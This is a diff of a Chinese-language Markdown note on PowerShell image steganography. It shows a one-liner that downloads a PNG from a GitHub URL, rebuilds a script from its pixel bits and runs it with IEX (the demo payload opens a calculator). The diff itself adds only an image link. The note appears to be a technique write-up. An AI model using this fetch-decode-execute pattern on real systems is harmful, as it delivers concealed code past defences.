@@ -73,6 +73,8 @@ powershell中输入如下，弹出计算器
 
 PS $```sal a New-Object;Add-Type -AssemblyName "System.Drawing";$g=a System.Drawing.Bitmap((a Net.WebClient).OpenRead("https://raw.githubusercontent.com/3gstudent/test/master/Evilwow.png"));$o=a Byte[] 500;(0..0)|%{foreach($x in(0..499)){$p=$g.GetPixel($x,$_);$o[$_*500+$x]=([math]::Floor(($p.B-band15)*16)-bor($p.G -band 15))}};IEX([System.Text.Encoding]::ASCII.GetString($o[0..13]))```
 
+![](1.jpg)
+
 **注意：图片像素数应大于payload字节数**
 
 ### 参考资料
